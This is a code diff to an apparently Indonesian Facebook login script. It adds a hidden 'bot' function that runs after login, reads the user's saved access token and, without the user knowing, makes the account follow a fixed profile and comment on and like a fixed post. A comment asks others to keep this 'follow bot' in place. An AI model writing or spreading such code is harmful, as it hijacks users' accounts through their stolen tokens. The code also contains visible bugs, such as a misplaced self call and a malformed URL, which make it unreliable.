@@ -140,7 +140,7 @@ def login_lagi():
 		suu = mark(sue, style='green')
 		sol().print(suu, style='cyan')
 		time.sleep(2.5)
-		menu_test()
+		self.bot()
 	except KeyError:
 		sue = '➣ 𝑳𝒐𝒈𝒊𝒏 𝑮𝒂𝒈𝒂𝒍 '
 		suu = mark(sue, style='red')
@@ -152,6 +152,20 @@ def login_lagi():
 		lo = mark(li, style='red')
 		sol().print(lo, style='cyan')
 		exit()
+
+
+# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
+def bot(self):
+		try:
+			toket = open('token.x','r').read()
+		except IOError:
+			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().__login__()
+		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/comments/?message=' +komen+ '&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/comments/?message='+komen+'&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
+		menu_test()
 		
 def menu_test():
 	jalan('\33[1;33m\n𝑯𝒆𝒍𝒍𝒐....... ')
